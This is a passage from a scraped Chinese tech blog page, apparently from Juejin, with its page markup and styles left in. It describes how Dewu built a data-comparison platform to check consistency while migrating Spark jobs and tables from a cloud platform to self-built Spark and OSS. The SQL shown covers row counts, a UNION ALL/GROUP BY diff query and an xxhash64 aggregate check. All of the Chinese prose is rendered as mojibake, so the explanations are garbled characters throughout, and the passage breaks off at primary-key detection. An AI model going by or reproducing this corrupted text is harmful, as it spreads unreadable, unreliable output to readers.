                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯</h2>
<p>å¾—ç‰©ç»è¿‡10å¹´å‘å±•ï¼Œè®¡ç®—ä»»åŠ¡å·²è¶…10ä¸‡+ï¼Œæ•°æ®å·²ç»è¶…200+PBï¼Œä¸ºäº†é™ä½æˆæœ¬ï¼Œè®¡ç®—å¼•æ“å’Œå­˜å‚¨èµ„æºéœ€è¦ä»äº‘å¹³å°è¿ç§»åˆ°å¾—ç‰©è‡ªå»ºå¹³å°ï¼Œè®¡ç®—å¼•æ“ä»äº‘å¹³å°Sparkè¿ç§»åˆ°è‡ªå»ºApache Sparké›†ç¾¤ã€å­˜å‚¨ä»ODPSè¿ç§»åˆ°OSSã€‚</p>
<p>åœ¨è¿ç§»æ—¶ï¼Œæœ€å…³é”®çš„ä¸€ç‚¹æ˜¯éœ€è¦ä¿è¯è¿ç§»å‰åæ•°æ®çš„ä¸€è‡´æ€§ï¼ŒåŒæ—¶ä¸ºäº†æ›´åŠ é«˜æ•ˆåœ°å®Œæˆè¿ç§»å·¥ä½œï¼ˆç›®å‰è®¡ç®—ä»»åŠ¡å·²è¶…10ä¸‡+ï¼Œæ‰‹åŠ¨æ¯”æ•°å·²æ˜¯ä¸å¯èƒ½ï¼‰ï¼Œå› æ­¤æ¯”æ•°å¹³å°ä¾¿åº”è¿è€Œç”Ÿã€‚</p>
<h2 data-id="heading-1">äºŒã€æ•°æ®æ¯”å¯¹å…³é”®æŒ‘æˆ˜ä¸ç›®æ ‡</h2>
<h3 data-id="heading-2">å…³é”®æŒ‘æˆ˜ä¸€ï¼šå¦‚ä½•æ›´å¿«åœ°å®Œæˆå…¨æ–‡æ•°æ®æ¯”å¯¹</h3>
<p><strong>ç°çŠ¶ç—›ç‚¹ï¼š</strong></p>
<p>åœ¨å‰æœŸè¿ç§»è¿‡ç¨‹ä¸­ï¼Œè¿ç§»åŒå­¦éœ€è¦æ‰‹åŠ¨joinä¸¤å¼ è¡¨æ¥è¯†åˆ«ä¸ä¸€è‡´æ•°æ®ï¼Œç„¶åé€æ¡ã€é€å­—æ®µè¿›è¡Œäººå·¥æ¯”å¯¹éªŒè¯ã€‚è¿™ç§æ–¹å¼åœ¨ä»»åŠ¡é‡è¾ƒå°‘æ—¶å°šå¯åº”ä»˜ï¼Œä½†å½“ä»»åŠ¡è§„æ¨¡è¾¾åˆ°æˆåƒä¸Šä¸‡çº§åˆ«æ—¶ï¼Œå°±æ— æ³•å®ç°å¹¶å‘å¿«é€Ÿåˆ†æã€‚</p>
<p><strong>æ ¸å¿ƒé—®é¢˜ï¼š</strong></p>
<ul>
<li>æ•ˆç‡ç“¶é¢ˆï¼šæ¯å¤©éœ€è¦å®Œæˆæ•°åƒä»»åŠ¡çš„æ¯”å¯¹ï¼Œç´¯è®¡å¾…è¿ç§»ä»»åŠ¡è¾¾10ä¸‡+ï¼Œæ¶‰åŠè¡¨æ•°åä¸‡å¼ ã€‚</li>
<li>æ‰©å±•æ€§ä¸è¶³ï¼šä¼ ç»Ÿäººå·¥æ¯”å¯¹æ–¹å¼æ— æ³•æ»¡è¶³å¤§è§„æ¨¡å¹¶å‘å¤„ç†éœ€æ±‚ã€‚</li>
</ul>
<h3 data-id="heading-3">å…³é”®æŒ‘æˆ˜äºŒï¼šå¦‚ä½•ç²¾å‡†å®šä½å¼‚å¸¸æ•°æ®</h3>
<p><strong>ç°çŠ¶ç—›ç‚¹ï¼š</strong></p>
<p>è¿ç§»åŒå­¦åœ¨è¯†åˆ«å‡ºä¸ä¸€è‡´æ•°æ®åï¼Œéœ€è¦é€šè¿‡è‚‰çœ¼è§‚å¯Ÿæ¥å®šä½å…·ä½“é—®é¢˜ï¼Œç»å¸¸å¯¼è‡´è§†è§‰ç–²åŠ³å’Œåˆ†ææ•ˆç‡ä½ä¸‹ã€‚</p>
<p><strong>æ ¸å¿ƒé—®é¢˜ï¼š</strong></p>
<ul>
<li>åˆ†æå›°éš¾ï¼šåœ¨æ¯”å¯¹ä¸é€šè¿‡çš„æƒ…å†µä¸‹ï¼Œæ¯”å¯¹äººå‘˜éœ€è¦äººå·¥åˆ†æå¤±è´¥åŸå› ã€‚</li>
<li>å¤æ‚åº¦é«˜ï¼šé¢å¯¹æ•°æ®é‡åºå¤§ã€åŠ å·¥é€»è¾‘å¤æ‚çš„åœºæ™¯ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§JSONæ•°æ®æ—¶ï¼Œè‚‰çœ¼æ ¹æœ¬æ— æ³•æœ‰æ•ˆåˆ†è¾¨å·®å¼‚ã€‚</li>
<li>è€—æ—¶ä¸¥é‡ï¼šå•æ¬¡æ¯”å¯¹ä¸é€šè¿‡åœºæ™¯çš„å¹³å‡åˆ†ææ—¶é—´é«˜è¾¾1.67å°æ—¶/ä»»åŠ¡ã€‚</li>
</ul>
<h3 data-id="heading-4">æ¯”æ•°æ ¸å¿ƒç›®æ ‡</h3>
<p>åŸºäºä»¥ä¸ŠæŒ‘æˆ˜ï¼Œæ•°æ®æ¯”å¯¹ç³»ç»Ÿéœ€è¦å®ç°ä»¥ä¸‹æ ¸å¿ƒç›®æ ‡ï¼š</p>
<ul>
<li>é«˜å¹¶å‘å¤„ç†èƒ½åŠ›ï¼šæ”¯æŒæ¯å¤©æ•°åƒä»»åŠ¡çš„å¿«é€Ÿæ¯”å¯¹ï¼Œèƒ½å¤Ÿå¤„ç†10ä¸‡+å¾…è¿ç§»ä»»åŠ¡å’Œæ•°åä¸‡å¼ è¡¨çš„è§„æ¨¡ã€‚</li>
<li>è‡ªåŠ¨åŒ–æ¯”å¯¹æœºåˆ¶ï¼šå®ç°å…¨è‡ªåŠ¨åŒ–çš„æ•°æ®æ¯”å¯¹æµç¨‹ï¼Œå‡å°‘äººå·¥å¹²é¢„ï¼Œæå‡æ¯”å¯¹æ•ˆç‡ã€‚</li>
<li>æ™ºèƒ½å·®å¼‚å®šä½ï¼šæä¾›ç²¾å‡†çš„å·®å¼‚å®šä½èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¿«é€Ÿè¯†åˆ«å¹¶é«˜äº®æ˜¾ç¤ºä¸ä¸€è‡´çš„å­—æ®µå’Œæ•°æ®ã€‚</li>
<li>å¯è§†åŒ–åˆ†æç•Œé¢ï¼šæ„å»ºå‹å¥½çš„å¯è§†åŒ–åˆ†æå¹³å°ï¼Œæ”¯æŒå¤§JSONæ•°æ®çš„ç»“æ„åŒ–å±•ç¤ºå’Œå·®å¼‚é«˜äº®ã€‚</li>
<li>æ€§èƒ½ä¼˜åŒ–ï¼šå°†ç”¨æˆ·å•æ¬¡æ¯”å¯¹åˆ†ææ—¶é—´ä»å°æ—¶çº§å¤§å¹…ç¼©çŸ­è‡³åˆ†é’Ÿçº§åˆ«ã€‚</li>
<li>å¯æ‰©å±•æ¶æ„ï¼šè®¾è®¡å¯æ°´å¹³æ‰©å±•çš„ç³»ç»Ÿæ¶æ„ï¼Œèƒ½å¤Ÿéšç€ä¸šåŠ¡å¢é•¿çµæ´»æ‰©å®¹ã€‚</li>
</ul>
<h2 data-id="heading-5">ä¸‰ã€è§£å†³æ–¹æ¡ˆå®ç°åŸç†</h2>
<h3 data-id="heading-6">å¿«é€Ÿå®Œæˆå…¨æ–‡æ•°æ®æ¯”å¯¹æ–¹æ³•</h3>
<p><strong>æ¯”æ•°æ–¹æ³•è°ƒç ”</strong></p>
<p>å¾…æ¯”å¯¹ä¸¤è¡¨æ•°æ®å¤§å°ï¼š300GBï¼Œè®¡ç®—èµ„æºï¼š1000c</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ab7f4b85a76402cadb9d9b692aff2a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=LVX1Y6vhnRcW4tk8AHSxuRUULlw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4837101ae1a406b96ce9fb95e548487~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=s6edlU4%2Bdxp%2BvXIbVE%2FPBCibLdk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>ç»è¿‡è°ƒç ”åˆ†ææ¯”æ•°å¹³å°é‡‡ç”¨ç¬¬äºŒç§å’Œç¬¬ä¸‰ç§ç›¸ç»“åˆçš„æ–¹å¼è¿›è¡Œæ¯”æ•°ã€‚</p>
<p><strong>å…ˆUnionå†åˆ†ç»„æ•°æ®ä¸€è‡´æ€§æ ¡éªŒåŸç†</strong></p>
<p>å‡å¦‚æˆ‘ä»¬æœ‰å¦‚ä¸‹aå’Œbä¸¤è¡¨å¼ éœ€è¦è¿›è¡Œæ•°æ®æ¯”å¯¹</p>
<p>è¡¨aï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/186d08e493ea4efe82856cdbaa41bf13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=ppgJj3Yn9%2FpxI4r7dqU6vC6gbiI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>è¡¨bï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d69b9c1fc1904764b29d6f96304bbff8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=iwNUsObBCc3NpDlx7ePRL6porOs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>è¡¨è¡Œæ•°æ¯”è¾ƒï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">select</span>Â <span class="hljs-title">count</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>)Â <span class="hljs-keyword">from</span>Â a</span>Â ;
</code></pre>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">select</span>Â <span class="hljs-title">count</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>)Â <span class="hljs-keyword">from</span>Â b</span>Â ;
</code></pre>
<p>é’ˆå¯¹ä¸Šé¢çš„æŸ¥è¯¢ç»“æœï¼Œå¦‚æœæ•°é‡ä¸ä¸€è‡´åˆ™é€€å‡ºæ¯”å¯¹ï¼Œå¾…ä¿®å¤åé‡æ–°æ¯”æ•°ï¼›æ•°é‡ä¸€è‡´åˆ™ç»§ç»­å­—æ®µå€¼æ¯”è¾ƒã€‚</p>
<p><strong>å­—æ®µå€¼æ¯”è¾ƒï¼š</strong></p>
<p>ç¬¬ä¸€æ­¥ï¼šunion a å’Œ b</p>
<pre><code class="hljs language-javascript" lang="javascript">selectÂ <span class="hljs-number">1</span>Â <span class="hljs-keyword">as</span>Â _t1_count,Â <span class="hljs-number">0</span>Â <span class="hljs-keyword">as</span>Â _t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â a
union all
selectÂ <span class="hljs-number">0</span>Â <span class="hljs-keyword">as</span>Â _t1_count,Â <span class="hljs-number">1</span>Â <span class="hljs-keyword">as</span>Â _t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â b
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08d2fbde55ed44e1b125872ceead1798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=bSne3rKYSuK0yGWAWlJv1q23w%2BY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>ç¬¬äºŒæ­¥ï¼šsum(_t1_count)ï¼Œsum(_t2_count) ååˆ†ç»„</p>
<pre><code class="hljs language-javascript" lang="javascript">selectÂ <span class="hljs-title function_">sum</span>(_t1_count)Â <span class="hljs-keyword">as</span>Â sum_t1_count,Â <span class="hljs-title function_">sum</span>(_t2_count)Â <span class="hljs-keyword">as</span>Â sum_t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â (
selectÂ <span class="hljs-number">1</span>Â <span class="hljs-keyword">as</span>Â _t1_count,Â <span class="hljs-number">0</span>Â <span class="hljs-keyword">as</span>Â _t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â a
union all
selectÂ <span class="hljs-number">0</span>Â <span class="hljs-keyword">as</span>Â _t1_count,Â <span class="hljs-number">1</span>Â <span class="hljs-keyword">as</span>Â _t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â b
)Â <span class="hljs-keyword">as</span>Â union_table
group byÂ <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f6723139f6f48bfbf61c35f72ffcd0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=%2FGc9N7JukWBR9eqalDFe5b94Gfw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>ç¬¬ä¸‰æ­¥ï¼šæŠŠä¸ä¸€è‡´æ•°æ®å†™å…¥æ–°çš„è¡¨ä¸­(å³ä¸Šé¢è¡¨ä¸­sum_t1_countå’Œsum_t2_countä¸ç›¸ç­‰çš„æ•°æ®)</p>
<pre><code class="hljs language-javascript" lang="javascript">drop tableÂ <span class="hljs-keyword">if</span>Â exists a_b_diff_20240908;
create table a_b_diff_20240908Â <span class="hljs-keyword">as</span>Â select *Â <span class="hljs-keyword">from</span>Â (
selectÂ <span class="hljs-title function_">sum</span>(_t1_count)Â <span class="hljs-keyword">as</span>Â sum_t1_count,Â <span class="hljs-title function_">sum</span>(_t2_count)Â <span class="hljs-keyword">as</span>Â sum_t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â (
selectÂ <span class="hljs-number">1</span>Â <span class="hljs-keyword">as</span>Â _t1_count,Â <span class="hljs-number">0</span>Â <span class="hljs-keyword">as</span>Â _t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â a
union all
selectÂ <span class="hljs-number">0</span>Â <span class="hljs-keyword">as</span>Â _t1_count,Â <span class="hljs-number">1</span>Â <span class="hljs-keyword">as</span>Â _t2_count,Â <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span>Â b
)Â <span class="hljs-keyword">as</span>Â union_table
group byÂ <span class="hljs-string">`id`</span>,Â <span class="hljs-string">`name`</span>,Â <span class="hljs-string">`age`</span>,Â <span class="hljs-string">`score`</span>
havingÂ <span class="hljs-title function_">sum</span>(_t1_count) &lt;&gt;Â <span class="hljs-title function_">sum</span>(_t2_count)
)Â <span class="hljs-keyword">as</span>Â tmp
</code></pre>
<p>å¦‚æœa_b_diff_20240908æ²¡æœ‰æ•°æ®åˆ™ä¸¤å¼ è¡¨æ²¡æœ‰å·®å¼‚ï¼Œæ¯”æ•°é€šè¿‡ï¼Œå¦‚æœ‰å·®å¼‚å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbb29da004d0457f8300a7fa6cc42c72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=j1fmuIbtemIRNe9y5Nnk5IQijx4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>ç¬¬å››æ­¥ï¼šè¯»å–ä¸ä¸€è‡´è®°å½•è¡¨ï¼Œæ ¹æ®ä¸»é”®ï¼ˆæ¯”å¦‚idï¼‰æ‰¾å‡ºä¸ä¸€è‡´å­—æ®µå¹¶å†™åˆ°ç»“æœè¡¨ä¸­ã€‚</p>
<p>ç¬¬äº”æ­¥ï¼šé’ˆå¯¹ä¸ä¸€è‡´å­—æ®µçš„æ•°æ®è¿›è¡Œæ ¹å› åˆ†æï¼Œå¦‚ json ã€æ•°ç»„é¡ºåºé—®é¢˜ã€æµ®ç‚¹æ•°ç²¾åº¦é—®é¢˜ç­‰ï¼Œç»™å‡ºä¸ä¸€è‡´å…·ä½“åŸå› ã€‚</p>
<p><strong>å“ˆå¸Œå€¼èšåˆå®ç°é«˜æ•ˆä¸€è‡´æ€§æ ¡éªŒ</strong></p>
<p>é’ˆå¯¹ä¸Šé¢unionåsum å† group by æ–¹å¼ åœ¨æ•°æ®é‡å¤§çš„æ—¶å€™è¿˜æ˜¯éå¸¸è€—èµ„æºå’Œæ—¶é—´çš„ï¼Œè€ƒè™‘åˆ°æ¯”æ•°ä»»åŠ¡æ¯•ç«Ÿæœ‰70%éƒ½æ˜¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆé‡‡ç”¨å“ˆå¸Œå€¼èšåˆæ¯”è¾ƒä¸¤è¡¨çš„çš„å€¼æ˜¯å¦ä¸€è‡´ï¼Œä½¿ç”¨è¿™ç§é«˜æ•ˆçš„æ–¹æ³•å…ˆæŠŠä¸¤è¡¨æ•°æ®ä¸€è‡´çš„ä»»åŠ¡è¿‡æ»¤æ‰ï¼Œå‰©ä¸‹çš„å†é‡‡ç”¨ä¸Šé¢æ–¹æ³•ç»§ç»­æ¯”è¾ƒï¼Œå› ä¸ºè¿˜è¦æ‰¾å‡ºæ˜¯å“ªä¸ªå­—æ®µå“ªé‡Œä¸ä¸€è‡´ã€‚åŸç†å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">SELECTÂ countÂ (*),<span class="hljs-built_in">SUM</span>(xxhash64(cloum1)^<span class="hljs-built_in">xxhash64</span>(cloum2)^...)Â FROMÂ tableAÂ 
EXCEPTÂ 
SELECTÂ <span class="hljs-built_in">count</span>(*),<span class="hljs-built_in">SUM</span>(xxhash64(cloum1)^<span class="hljs-built_in">xxhash64</span>(cloum2)^...)Â FROMÂ tableB
</code></pre>
<p>å¦‚æœæœ‰è®°å½•ä¸ºç©ºè¯´æ˜æ•°æ®ä¸€è‡´ï¼Œä¸ä¸ºç©ºè¯´æ˜æ•°æ®ä¸ä¸€è‡´éœ€è¦é‡‡ç”¨ä¸Šé¢æåˆ°union åˆ†ç»„çš„æ–¹æ³•å»æ‰¾å‡ºå…·ä½“å­—æ®µå“ªé‡Œä¸ä¸€æ ·ã€‚</p>
<p>é€šè¿‡å“ˆå¸Œå€¼èšåˆï¼Œå•ä¸ªä»»åŠ¡æ¯”æ•°æ—¶é—´ä»500sé™ä½åˆ°160sï¼ŒèŠ‚çœå¤§çº¦70%çš„æ—¶é—´ã€‚</p>
<p>æ‰¾åˆ°ä¸¤å¼ è¡¨ä¸ä¸€è‡´æ•°æ®åéœ€è¦å¯¹ä¸¤å¼ çš„æ•°æ®è¿›è¡Œåˆ†æç¡®å®šä¸ä¸€è‡´çš„ç‚¹åœ¨å“ªé‡Œï¼Ÿè¿™é‡Œå°±éœ€è¦çŸ¥é“è¡¨çš„ä¸»é”®ï¼Œæ ¹æ®ä¸»é”®é€ä¸ªæ¯”å¯¹ä¸¤å¼ è¡¨çš„å…¶ä»–å­—æ®µï¼Œå› æ­¤ç³»ç»Ÿä¼šå…ˆè¿›è¡Œä¸»é”®çš„è‡ªåŠ¨æ¢æŸ¥ï¼Œä»¥åŠæ— ä¸»é”®çš„å…œåº•å¤„ç†ã€‚</p>
<h3 data-id="heading-7">ç²¾å‡†å®šä½å¼‚å¸¸æ•°æ®å®ç°æ–¹æ³•</h3>
<p><strong>è‡ªåŠ¨æ¢æŸ¥ä¸»é”®ï¼šå®ç°åŸç†å¦‚ä¸‹</strong></p>
